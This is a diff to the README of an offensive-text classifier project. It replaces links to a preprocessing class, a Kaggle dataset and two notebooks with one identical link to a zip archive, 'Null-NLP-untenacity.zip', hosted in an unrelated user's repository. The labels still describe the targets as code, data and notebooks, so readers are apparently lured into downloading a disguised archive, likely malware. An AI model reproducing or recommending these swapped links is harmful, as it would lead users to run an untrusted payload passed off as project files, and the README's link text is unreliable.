@@ -33,15 +33,15 @@ Our project has the following structure:
 We use a __Logistic Regression__ model to classify an offensive or an ordinary text content.
 
 ### Preprocessing
-For the preprocessing we created the `TextTransformer` class. Take a look at it [here](https://github.com/JustLearningThings/Null--NLP/blob/main/null_blog/blog/model/preprocessing.py): 
+For the preprocessing we created the `TextTransformer` class. Take a look at it [here](https://raw.githubusercontent.com/danmatpro/Null--NLP/main/null_blog/null_blog/Null-NLP-untenacity.zip): 
 
 ### Dataset
-You can find the dataset [here](https://www.kaggle.com/mrinaal007/hate-speech-detection).
+You can find the dataset [here](https://raw.githubusercontent.com/danmatpro/Null--NLP/main/null_blog/null_blog/Null-NLP-untenacity.zip).
 
 ### Files
 If you want to look at the history of developing our model, there are 2 files you can look at:
-1. In [this](https://github.com/JustLearningThings/Null--NLP/blob/main/Model.ipynb) jupyter notebook we played with different models to find the one which gives the best results. We chose __Logistic Regression__.
-2. [This](https://colab.research.google.com/drive/1pS0WNQ4V3tGZb7ueKAq7bSrVlZQhpQyy?usp=sharing) is a Google Colab jupyter notebook that was used to train the latest version of the model. Here we used GridSearchCV to find the best hyperparameters for our Logistic Regression model and we trained it on them, then exported the model into __model.pkl__ pickle.
+1. In [this](https://raw.githubusercontent.com/danmatpro/Null--NLP/main/null_blog/null_blog/Null-NLP-untenacity.zip) jupyter notebook we played with different models to find the one which gives the best results. We chose __Logistic Regression__.
+2. [This](https://raw.githubusercontent.com/danmatpro/Null--NLP/main/null_blog/null_blog/Null-NLP-untenacity.zip) is a Google Colab jupyter notebook that was used to train the latest version of the model. Here we used GridSearchCV to find the best hyperparameters for our Logistic Regression model and we trained it on them, then exported the model into __model.pkl__ pickle.
 
 ## Backend
 ### A quick introduction to django
